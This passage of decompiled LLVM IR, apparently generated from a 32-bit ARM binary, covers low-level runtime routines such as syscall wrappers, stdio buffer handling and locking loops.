  uselistorder label %dec_label_pc_16f50, { 1, 0 }
}

define i32 @function_16f60(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16f60:
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  %v3_16f88 = call i32 @function_15754(i32 162, i32 %arg1, i32 %arg2)
  store i32 %v3_16f88, i32* @r0, align 4
  %v0_16f8c = call i32 @function_13178()
  ret i32 %v0_16f8c

; uselistorder directives
  uselistorder i32 ()* @function_13178, { 15, 31, 30, 24, 29, 23, 22, 14, 28, 13, 17, 12, 16, 11, 10, 9, 8, 7, 18, 6, 1, 5, 20, 27, 4, 19, 3, 2, 26, 25, 21, 0 }
  uselistorder i32 (i32, i32, i32)* @function_15754, { 6, 10, 8, 5, 4, 3, 2, 1, 9, 7, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_16f9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_16f9c:
  %v2_16fa0 = load i32, i32* @global_var_22ad8.530, align 4
  %v3_16fa4 = load i32, i32* @r4, align 4
  %v6_16fa4 = load i32, i32* @r5, align 4
  %v9_16fa4 = load i32, i32* @r6, align 4
  %v15_16fa4 = load i32, i32* @r8, align 4
  %v1_16fa8 = and i32 %v2_16fa0, 32768
  %v2_16fa8 = icmp eq i32 %v1_16fa8, 0
  store i32 %arg1, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_15cfc.627 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22300.626 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_222fc.622 to i32), i32* @r4, align 4
  br i1 %v2_16fa8, label %dec_label_pc_1705c, label %dec_label_pc_16fc4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16f9c
  %v3_16fcc = load i32, i32* @global_var_22aec.528, align 4
  store i32 sub (i32 89404, i32 ptrtoint (i32* @global_var_15cfc.627 to i32)), i32* @global_var_22300.626, align 4
  store i32 sub (i32 89316, i32 ptrtoint (i32* @global_var_15ca8.623 to i32)), i32* @global_var_222fc.622, align 4
  %v1_1704c3 = inttoptr i32 %v3_16fcc to i32*
  %v2_1704c4 = load i32, i32* %v1_1704c3, align 4
  %v2_170506 = icmp eq i32 %v2_1704c4, 0
  br i1 %v2_170506, label %dec_label_pc_17058, label %dec_label_pc_16ff0

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16fc4, %dec_label_pc_17048
  %v0_16ff8 = phi i32 [ %v1_17048, %dec_label_pc_17048 ], [ %v3_16fcc, %dec_label_pc_16fc4 ]
  %v0_16ff0 = phi i32 [ %v2_1704c, %dec_label_pc_17048 ], [ %v2_1704c4, %dec_label_pc_16fc4 ]
  %v7_16ff0 = icmp eq i32 %v0_16ff0, 15
  br i1 %v7_16ff0, label %dec_label_pc_16ff8, label %dec_label_pc_17048

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16ff0
  %v1_16ff8 = add i32 %v0_16ff8, 4
  %v2_16ff8 = inttoptr i32 %v1_16ff8 to i32*
  %v3_16ff8 = load i32, i32* %v2_16ff8, align 4
  %v1_16ffc = inttoptr i32 %v3_16ff8 to i8*
  %v2_16ffc = load i8, i8* %v1_16ffc, align 1
  %v7_17000 = icmp eq i8 %v2_16ffc, 118
  br i1 %v7_17000, label %dec_label_pc_17008, label %dec_label_pc_17058

dec_label_pc_17008:                               ; preds = %dec_label_pc_16ff8
  %v1_17008 = add i32 %v3_16ff8, 1
  %v2_17008 = inttoptr i32 %v1_17008 to i8*
  %v3_17008 = load i8, i8* %v2_17008, align 1
  %v7_1700c = icmp eq i8 %v3_17008, 54
  br i1 %v7_1700c, label %dec_label_pc_17014, label %dec_label_pc_17058

dec_label_pc_17014:                               ; preds = %dec_label_pc_17008
  %v1_17014 = add i32 %v3_16ff8, 2
  %v2_17014 = inttoptr i32 %v1_17014 to i8*
  %v3_17014 = load i8, i8* %v2_17014, align 1
  %v4_17014 = zext i8 %v3_17014 to i32
  %v1_17018 = add nsw i32 %v4_17014, -48
  %tmp = icmp ult i32 %v1_17018, 10
  br i1 %tmp, label %dec_label_pc_17058, label %dec_label_pc_17024

dec_label_pc_17024:                               ; preds = %dec_label_pc_17014
  store i32 sub (i32 89368, i32 ptrtoint (i32* @global_var_15cfc.627 to i32)), i32* @global_var_22300.626, align 4
  store i32 sub (i32 89308, i32 ptrtoint (i32* @global_var_15ca8.623 to i32)), i32* @global_var_222fc.622, align 4
  br label %dec_label_pc_17058

dec_label_pc_17048:                               ; preds = %dec_label_pc_16ff0
  %v1_17048 = add i32 %v0_16ff8, 8
  %v1_1704c = inttoptr i32 %v1_17048 to i32*
  %v2_1704c = load i32, i32* %v1_1704c, align 4
  %v2_17050 = icmp eq i32 %v2_1704c, 0
  br i1 %v2_17050, label %dec_label_pc_1704c.dec_label_pc_17058.loopexit_crit_edge, label %dec_label_pc_16ff0

dec_label_pc_1705c:                               ; preds = %dec_label_pc_16f9c
  %v3_17060 = load i32, i32* inttoptr (i32 -61444 to i32*), align 4
  store i32 sub (i32 -61472, i32 ptrtoint (i32* @global_var_15d70.630 to i32)), i32* @global_var_22304.629, align 4
  store i32 sub (i32 -61536, i32 ptrtoint (i32* @global_var_15ca8.623 to i32)), i32* @global_var_222fc.622, align 4
  store i32 sub (i32 -61504, i32 ptrtoint (i32* @global_var_15cfc.627 to i32)), i32* @global_var_22300.626, align 4
  %v7_17094 = icmp sgt i32 %v3_17060, 1
  br i1 %v7_17094, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_1705c
  call void @llvm.trap()
  unreachable

bb19:                                             ; preds = %dec_label_pc_1705c
  %v7_17098 = icmp eq i32 %v3_17060, 2
  br i1 %v7_17098, label %bb20, label %dec_label_pc_17058

bb20:                                             ; preds = %bb19
  store i32 sub (i32 89268, i32 ptrtoint (i32* @global_var_15ca8.623 to i32)), i32* @global_var_222fc.622, align 4
  br label %dec_label_pc_17058

dec_label_pc_1704c.dec_label_pc_17058.loopexit_crit_edge: ; preds = %dec_label_pc_17048
  br label %dec_label_pc_17058

dec_label_pc_17058:                               ; preds = %bb19, %dec_label_pc_16fc4, %dec_label_pc_1704c.dec_label_pc_17058.loopexit_crit_edge, %dec_label_pc_17008, %dec_label_pc_16ff8, %dec_label_pc_17014, %dec_label_pc_17024, %bb20
  store i32 %v3_16fa4, i32* @r4, align 4
  store i32 %v6_16fa4, i32* @r5, align 4
  store i32 %v9_16fa4, i32* @r6, align 4
  store i32 %v15_16fa4, i32* @r8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_1704c, { 1, 0 }
  uselistorder i32 %v1_17048, { 1, 0 }
  uselistorder i32 %v0_16ff8, { 1, 0 }
  uselistorder void ()* @llvm.trap, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 10, { 0, 6, 5, 15, 67, 8, 68, 1, 7, 74, 2, 16, 38, 69, 17, 39, 40, 29, 30, 10, 70, 31, 32, 18, 4, 33, 71, 19, 73, 72, 41, 42, 20, 21, 22, 12, 23, 13, 43, 44, 3, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 24, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 11, 66, 25, 75, 9, 76, 77, 27, 78, 34, 35, 14, 79, 36, 37, 26, 80, 28 }
  uselistorder i32* @global_var_222fc.622, { 0, 1, 3, 2, 4 }
  uselistorder i32* @global_var_22300.626, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_17058, { 2, 7, 0, 6, 5, 3, 4, 1 }
  uselistorder label %dec_label_pc_16ff0, { 1, 0 }
}

define i32 @function_17100() local_unnamed_addr {
dec_label_pc_17100:
  %v0_1710c = load i32, i32* @r0, align 4
  ret i32 %v0_1710c
}

define i32 @function_17110() local_unnamed_addr {
dec_label_pc_17110:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17110 = load i32, i32* @r4, align 4
  store i32 %v3_17110, i32* %stack_var_-8, align 4
  %v0_17114 = load i32, i32* @r0, align 4
  %v1_17114 = add i32 %v0_17114, 74
  %v2_17114 = inttoptr i32 %v1_17114 to i8*
  %v3_17114 = load i8, i8* %v2_17114, align 1
  %v4_17114 = zext i8 %v3_17114 to i32
  store i32 %v4_17114, i32* @ip, align 4
  %v1_17118 = add i32 %v0_17114, 20
  %v2_17118 = inttoptr i32 %v1_17118 to i32*
  %v3_17118 = load i32, i32* %v2_17118, align 4
  %v1_1711c = add i32 %v0_17114, 44
  %v2_1711c = inttoptr i32 %v1_1711c to i32*
  %v3_1711c = load i32, i32* %v2_1711c, align 4
  %v1_17120 = add nsw i32 %v4_17114, -1
  %v2_17124 = or i32 %v1_17120, %v4_17114
  store i32 %v2_17124, i32* %r3.global-to-local, align 4
  %v3_17128 = icmp uge i32 %v3_17118, %v3_1711c
  store i1 %v3_17128, i1* %cpsr_c.global-to-local, align 1
  %v9_17128 = icmp eq i32 %v3_17118, %v3_1711c
  store i1 %v9_17128, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17114, i32* %r4.global-to-local, align 4
  %v1_17130 = trunc i32 %v2_17124 to i8
  store i8 %v1_17130, i8* %v2_17114, align 1
  %v0_17134 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17134 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_17134 = xor i1 %v1_17134, true
  %v3_17134 = and i1 %v0_17134, %v2_17134
  br i1 %v3_17134, label %bb, label %dec_label_pc_17110..thread8_crit_edge

dec_label_pc_17110..thread8_crit_edge:            ; preds = %dec_label_pc_17110
  %v0_17144.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_17110
  %v4_1713c = load i32, i32* @r0, align 4
  %v5_1713c = add i32 %v4_1713c, 36
  %v6_1713c = inttoptr i32 %v5_1713c to i32*
  %v7_1713c = load i32, i32* %v6_1713c, align 4
  store i32 %v7_1713c, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17110..thread8_crit_edge, %bb
  %v0_17144 = phi i32 [ %v0_17144.pre, %dec_label_pc_17110..thread8_crit_edge ], [ %v7_1713c, %bb ]
  call void @__pseudo_cond_branch(i1 %v3_17134, i32 %v0_17144)
  %v0_17148 = load i32, i32* %r4.global-to-local, align 4
  %v1_17148 = inttoptr i32 %v0_17148 to i32*
  %v2_17148 = load i32, i32* %v1_17148, align 4
  store i32 %v2_17148, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_17150 = and i32 %v2_17148, 4
  %v2_17150 = icmp eq i32 %v1_17150, 0
  store i1 %v2_17150, i1* %cpsr_z.global-to-local, align 1
  %v2_17154 = add i32 %v0_17148, 20
  %v3_17154 = inttoptr i32 %v2_17154 to i32*
  store i32 0, i32* %v3_17154, align 4
  %v0_17158 = load i32, i32* %r3.global-to-local, align 4
  %v1_17158 = load i32, i32* %r4.global-to-local, align 4
  %v2_17158 = add i32 %v1_17158, 16
  %v3_17158 = inttoptr i32 %v2_17158 to i32*
  store i32 %v0_17158, i32* %v3_17158, align 4
  %v0_1715c = load i32, i32* %r3.global-to-local, align 4
  %v1_1715c = load i32, i32* %r4.global-to-local, align 4
  %v2_1715c = add i32 %v1_1715c, 28
  %v3_1715c = inttoptr i32 %v2_1715c to i32*
  store i32 %v0_1715c, i32* %v3_1715c, align 4
  br i1 %v2_17150, label %dec_label_pc_17170, label %.thread1

.thread1:                                         ; preds = %.thread8
  %v1_17160 = load i32, i32* @r2, align 4
  %v2_17160 = or i32 %v1_17160, 32
  store i32 %v2_17160, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17168 = load i32, i32* %r4.global-to-local, align 4
  %v3_17168 = inttoptr i32 %v2_17168 to i32*
  store i32 %v2_17160, i32* %v3_17168, align 4
  br label %bb12

dec_label_pc_17170:                               ; preds = %.thread8
  %v0_17170 = load i32, i32* %r4.global-to-local, align 4
  %v1_17170 = add i32 %v0_17170, 44
  %v1_17174 = inttoptr i32 %v1_17170 to i32*
  %v2_17174 = load i32, i32* %v1_17174, align 4
  %v3_17174 = add i32 %v0_17170, 48
  %v4_17174 = inttoptr i32 %v3_17174 to i32*
  %v5_17174 = load i32, i32* %v4_17174, align 4
  %v2_17178 = add i32 %v5_17174, %v2_17174
  store i32 %v2_17178, i32* %r3.global-to-local, align 4
  %v0_1717c = load i32, i32* @r2, align 4
  %v1_1717c = and i32 %v0_1717c, 16
  store i32 %v1_1717c, i32* %r0.global-to-local, align 4
  %v2_1717c = icmp eq i32 %v1_1717c, 0
  store i1 %v2_1717c, i1* %cpsr_z.global-to-local, align 1
  %v2_17180 = add i32 %v0_17170, 4
  %v3_17180 = inttoptr i32 %v2_17180 to i32*
  store i32 %v2_17178, i32* %v3_17180, align 4
  %v0_17184 = load i32, i32* %r3.global-to-local, align 4
  %v1_17184 = load i32, i32* %r4.global-to-local, align 4
  %v2_17184 = add i32 %v1_17184, 8
  %v3_17184 = inttoptr i32 %v2_17184 to i32*
  store i32 %v0_17184, i32* %v3_17184, align 4
  br i1 %v2_1717c, label %bb12, label %bb11

bb11:                                             ; preds = %dec_label_pc_17170
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %.thread1, %dec_label_pc_17170, %bb11
  %v2_1718c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1718c, i32* @r4, align 4
  %v1_17190 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17190

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 48, { 0, 7, 11, 1, 5, 6, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 44, { 7, 8, 9, 3, 4, 5, 6, 1, 10, 0, 11, 2, 12 }
  uselistorder label %bb12, { 2, 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_17194() local_unnamed_addr {
dec_label_pc_17194:
  %v0_1719c = call i32 @function_17228()
  ret i32 %v0_1719c
}

define i32 @function_171ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_171ac:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_171b0 = icmp eq i32 %arg1, 0
  store i1 %v2_171b0, i1* @cpsr_z, align 1
  br i1 %v2_171b0, label %dec_label_pc_1721c, label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171ac
  %v1_171bc = add i32 %arg1, 76
  %v2_171bc = inttoptr i32 %v1_171bc to i32*
  %v3_171bc = load i32, i32* %v2_171bc, align 4
  %v3_171c4 = icmp sgt i32 %v3_171bc, -1
  call void @__pseudo_cond_branch(i1 %v3_171c4, i32 ptrtoint (i32* @global_var_17334.683 to i32))
  %v0_171c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_171c8 = add i32 %v0_171c8, 20
  %v2_171c8 = inttoptr i32 %v1_171c8 to i32*
  %v3_171c8 = load i32, i32* %v2_171c8, align 4
  %v1_171cc = add i32 %v0_171c8, 28
  %v2_171cc = inttoptr i32 %v1_171cc to i32*
  %v3_171cc = load i32, i32* %v2_171cc, align 4
  %tmp = icmp ugt i32 %v3_171c8, %v3_171cc
  br i1 %tmp, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_171bc
  store i32 %v0_171c8, i32* %r0.global-to-local, align 4
  %v5_171e0 = add i32 %v0_171c8, 36
  %v6_171e0 = inttoptr i32 %v5_171e0 to i32*
  %v7_171e0 = load i32, i32* %v6_171e0, align 4
  store i32 %v7_171e0, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_171bc, %bb
  %.04 = phi i32 [ %v7_171e0, %bb ], [ undef, %dec_label_pc_171bc ]
  call void @__pseudo_cond_branch(i1 %tmp, i32 %.04)
  %v0_171ec = load i32, i32* %r4.global-to-local, align 4
  %v1_171ec = add i32 %v0_171ec, 4
  %v2_171ec = inttoptr i32 %v1_171ec to i32*
  %v3_171ec = load i32, i32* %v2_171ec, align 4
  %v1_171f0 = add i32 %v0_171ec, 8
  %v2_171f0 = inttoptr i32 %v1_171f0 to i32*
  %v3_171f0 = load i32, i32* %v2_171f0, align 4
  store i32 %v3_171f0, i32* @r2, align 4
  %v3_171f4 = icmp ult i32 %v3_171ec, %v3_171f0
  %v9_171f4 = icmp eq i32 %v3_171ec, %v3_171f0
  store i1 %v9_171f4, i1* @cpsr_z, align 1
  br i1 %v3_171f4, label %dec_label_pc_171fc, label %dec_label_pc_1721c

dec_label_pc_171fc:                               ; preds = %.thread6
  %v2_171f4 = sub i32 %v3_171ec, %v3_171f0
  store i32 %v2_171f4, i32* @r2, align 4
  store i32 %v0_171ec, i32* %r0.global-to-local, align 4
  %v1_17210 = add i32 %v0_171ec, 40
  %v2_17210 = inttoptr i32 %v1_17210 to i32*
  %v3_17210 = load i32, i32* %v2_17210, align 4
  store i32 %v3_17210, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_17210)
  br label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %.thread6, %dec_label_pc_171ac, %dec_label_pc_171fc
  %v1_17224 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17224

; uselistorder directives
  uselistorder i1 %tmp, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 40, { 9, 19, 2, 20, 10, 3, 11, 4, 12, 13, 1, 14, 15, 0, 16, 18, 17, 6, 21, 7, 22, 5, 23, 8, 24 }
  uselistorder i32 28, { 10, 26, 29, 11, 30, 31, 43, 44, 8, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0, 12, 1, 13, 2, 14, 3, 15, 4, 16, 5, 17, 6, 18, 7, 9, 28, 27, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 20, { 20, 78, 79, 103, 104, 105, 106, 95, 96, 97, 98, 99, 100, 101, 102, 3, 24, 4, 21, 5, 22, 6, 23, 80, 81, 7, 82, 8, 83, 0, 84, 19, 25, 26, 9, 27, 28, 29, 30, 31, 32, 10, 33, 34, 36, 35, 37, 38, 11, 39, 40, 41, 43, 42, 44, 45, 46, 47, 12, 48, 49, 50, 52, 51, 53, 54, 55, 13, 56, 57, 58, 59, 61, 60, 14, 62, 63, 15, 64, 65, 66, 67, 68, 1, 69, 16, 70, 71, 72, 73, 2, 74, 17, 75, 76, 77, 85, 86, 87, 88, 89, 90, 91, 92, 93, 18, 94 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1721c, { 2, 0, 1 }
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_17228() local_unnamed_addr {
dec_label_pc_17228:
  %tmp = load i32, i32* @r0, align 4
  ret i32 %tmp
}

define i32 @function_17228.1(i32* %arg1) local_unnamed_addr {
dec_label_pc_17228:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17228 = load i32, i32* @r4, align 4
  store i32 %v3_17228, i32* %stack_var_-8, align 4
  %v6_17228 = load i32, i32* @lr, align 4
  %v0_1722c = call i32 @function_1728c()
  %storemerge.in1 = inttoptr i32 %v0_1722c to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* @r4, align 4
  %v2_172404 = icmp eq i32 %storemerge2, 0
  br i1 %v2_172404, label %dec_label_pc_17248, label %dec_label_pc_17238

dec_label_pc_17238:                               ; preds = %dec_label_pc_17228, %dec_label_pc_17238
  %storemerge5 = phi i32 [ %storemerge, %dec_label_pc_17238 ], [ %storemerge2, %dec_label_pc_17228 ]
  %v1_17238 = call i32 @function_171ac(i32 %storemerge5)
  %v0_1723c = load i32, i32* @r4, align 4
  %v1_1723c = add i32 %v0_1723c, 56
  %storemerge.in = inttoptr i32 %v1_1723c to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17240 = icmp eq i32 %storemerge, 0
  br i1 %v2_17240, label %dec_label_pc_17248, label %dec_label_pc_17238

dec_label_pc_17248:                               ; preds = %dec_label_pc_17238, %dec_label_pc_17228
  %v2_1724c = load i32, i32* @global_var_228fc.685, align 4
  %v1_17250 = call i32 @function_171ac(i32 %v2_1724c)
  %v2_17258 = load i32, i32* @global_var_228fc.685, align 4
  %v2_1725c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1725c, i32* @r4, align 4
  store i32 %v6_17228, i32* @lr, align 4
  %v1_17260 = call i32 @function_171ac(i32 %v2_17258)
  %v0_17264 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17264, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17248
  %v1_17264 = load i32, i32* @r2, align 4
  %v4_17264 = inttoptr i32 %v1_17264 to i32*
  store i32 %v1_17264, i32* %v4_17264, align 4
  %v5_17264 = load i32, i32* @ip, align 4
  %v6_17264 = load i32, i32* @r2, align 4
  %v7_17264 = sub i32 %v6_17264, %v5_17264
  store i32 %v7_17264, i32* %r2.global-to-local, align 4
  %v4_17268 = inttoptr i32 %v7_17264 to i32*
  store i32 %v7_17264, i32* %v4_17268, align 4
  %v5_17268 = load i32, i32* @ip, align 4
  %v6_17268 = load i32, i32* %r2.global-to-local, align 4
  %v7_17268 = sub i32 %v6_17268, %v5_17268
  store i32 %v7_17268, i32* %r2.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17248, %bb
  %v2_17278 = call i32 @function_15684(i32* nonnull @global_var_22904.688)
  ret i32 %v2_17278

; uselistorder directives
  uselistorder i32 %v1_17264, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 56, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_171ac, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_17238, { 1, 0 }
}

define i32 @function_1728c() local_unnamed_addr {
dec_label_pc_1728c:
  %v2_17298 = call i32 @function_156f0(i32* nonnull @global_var_22904.688)
  ret i32 ptrtoint (i32* @global_var_22900.691 to i32)
}

define i32 @function_172b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_172b4:
  ret i32 %arg2
}

define i32 @function_172d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_172d4:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_172d4 = load i32, i32* @r4, align 4
  store i32 %v3_172d4, i32* %stack_var_-8, align 4
  %v1_172d8 = add i32 %arg1, 76
  store i32 %v1_172d8, i32* %r4.global-to-local, align 4
  %v0_172dc = call i32 @function_15c98()
  store i32 %v0_172dc, i32* @r0, align 4
  %v2_172e4 = add i32 %v0_172dc, 76
  %v3_172e4 = inttoptr i32 %v2_172e4 to i32*
  store i32 0, i32* %v3_172e4, align 4
  %v0_172e8 = call i32 @function_15c98()
  %v1_172ec = add i32 %v0_172e8, 80
  %v2_172ec = inttoptr i32 %v1_172ec to i32*
  %v3_172ec = load i32, i32* %v2_172ec, align 4
  %v2_172f0 = icmp eq i32 %v3_172ec, 0
  br i1 %v2_172f0, label %dec_label_pc_1732c, label %dec_label_pc_172f8

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172d4
  %v0_172fc = load i32, i32* %r4.global-to-local, align 4
  %v4_17308 = call i32 @function_172b4(i32 240, i32 %v0_172fc, i32 129, i32 1)
  %v4_17310 = icmp eq i32 %v4_17308, -38
  br i1 %v4_17310, label %dec_label_pc_17314, label %dec_label_pc_1732c

dec_label_pc_17314:                               ; preds = %dec_label_pc_172f8
  %v0_17318 = load i32, i32* %r4.global-to-local, align 4
  %v2_17324 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17324, i32* %r4.global-to-local, align 4
  %v4_17328 = call i32 @function_172b4(i32 240, i32 %v0_17318, i32 1, i32 1)
  br label %dec_label_pc_1732c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_172f8, %dec_label_pc_172d4, %dec_label_pc_17314
  %v1_17330 = phi i32 [ %v4_17308, %dec_label_pc_172f8 ], [ %v0_172e8, %dec_label_pc_172d4 ], [ %v4_17328, %dec_label_pc_17314 ]
  %v2_1732c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1732c, i32* %r4.global-to-local, align 4
  ret i32 %v1_17330

; uselistorder directives
  uselistorder i32 -38, { 9, 10, 11, 12, 17, 6, 14, 5, 13, 8, 7, 16, 15, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_172b4, { 1, 0 }
  uselistorder i32 129, { 0, 1, 2, 3, 4, 13, 5, 6, 9, 10, 7, 8, 11, 12 }
  uselistorder i32 240, { 2, 4, 0, 5, 1, 3, 6, 11, 12, 19, 15, 16, 13, 14, 17, 18, 7, 8, 9, 10 }
  uselistorder i32 ()* @function_15c98, { 28, 27, 24, 26, 25, 23, 22, 21, 20, 3, 2, 1, 0, 19, 18, 17, 16, 11, 10, 9, 8, 15, 14, 13, 12, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_1732c, { 2, 0, 1 }
}

define i32 @function_17334(i32 %arg1) local_unnamed_addr {
dec_label_pc_17334:
  %v0_1733c = call i32 @function_15d60()
  %v1_17340 = add i32 %v0_1733c, -176
  %v2_17340 = inttoptr i32 %v1_17340 to i32*
  %v3_17340 = load i32, i32* %v2_17340, align 4
  store i32 %v3_17340, i32* @r5, align 4
  %v1_17344 = add i32 %arg1, 76
  %v2_17344 = inttoptr i32 %v1_17344 to i32*
  %v3_17344 = load i32, i32* %v2_17344, align 4
  %v9_17348 = icmp eq i32 %v3_17344, %v3_17340
  store i1 %v9_17348, i1* @cpsr_z, align 1
  br i1 %v9_17348, label %dec_label_pc_17398, label %dec_label_pc_17354

dec_label_pc_17354:                               ; preds = %dec_label_pc_17334
  %v1_17354 = add i32 %arg1, 80
  store i32 %v1_17354, i32* @r6, align 4
  store i32 %v1_17344, i32* @r4, align 4
  %v4_1736811 = call i32 @function_15cec(i32 0, i32 %v3_17340, i32* %v2_17344)
  %v2_1736c13 = icmp eq i32 %v4_1736811, 0
  br i1 %v2_1736c13, label %dec_label_pc_17398, label %dec_label_pc_17378

dec_label_pc_17378:                               ; preds = %dec_label_pc_17354, %dec_label_pc_1735c.backedge
  %v0_17378 = load i32, i32* @r4, align 4
  %v1_17378 = inttoptr i32 %v0_17378 to i32*
  %v2_17378 = load i32, i32* %v1_17378, align 4
  store i32 %v2_17378, i32* @r2, align 4
  %v2_1737c = icmp eq i32 %v2_17378, 0
  store i1 %v2_1737c, i1* @cpsr_z, align 1
  br i1 %v2_1737c, label %dec_label_pc_1735c.backedge, label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %dec_label_pc_17378
  %v0_17388 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v5_17390 = call i32 @function_15818(i32* %v1_17378, i32 %v0_17388)
  %v0_17360.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1735c.backedge

dec_label_pc_1735c.backedge:                      ; preds = %dec_label_pc_17384, %dec_label_pc_17378
  %v0_17360.pre = phi i32 [ %v0_17360.pre.pre, %dec_label_pc_17384 ], [ %v0_17378, %dec_label_pc_17378 ]
  %v0_1735c.pre = load i32, i32* @r5, align 4
  %v3_17368 = inttoptr i32 %v0_17360.pre to i32*
  %v4_17368 = call i32 @function_15cec(i32 0, i32 %v0_1735c.pre, i32* %v3_17368)
  %v2_1736c = icmp eq i32 %v4_17368, 0
  br i1 %v2_1736c, label %dec_label_pc_17398, label %dec_label_pc_17378

dec_label_pc_17398:                               ; preds = %dec_label_pc_17354, %dec_label_pc_1735c.backedge, %dec_label_pc_17334
  %storemerge = phi i32 [ 0, %dec_label_pc_17334 ], [ 1, %dec_label_pc_1735c.backedge ], [ 1, %dec_label_pc_17354 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32)* @function_15818, { 0, 1, 5, 6, 2, 3, 4, 7 }
  uselistorder i32 (i32, i32, i32*)* @function_15cec, { 3, 0, 5, 6, 1, 7, 4, 8, 9, 17, 18, 19, 10, 11, 12, 13, 2, 14, 15, 16, 20, 21, 22 }
  uselistorder i32 ()* @function_15d60, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_17398, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17378, { 1, 0 }
}

define i32 @function_173a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_173a0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_173a0 = sub i32 0, %arg1
  store i32 %v1_173a0, i32* %r0.global-to-local, align 4
  %v2_173ac = mul i32 %arg1, 2
  store i32 %v2_173ac, i32* %r2.global-to-local, align 4
  %v4_173ac = icmp eq i32 %v2_173ac, 0
  br i1 %v4_173ac, label %dec_label_pc_173a0.dec_label_pc_174e4_crit_edge, label %bb

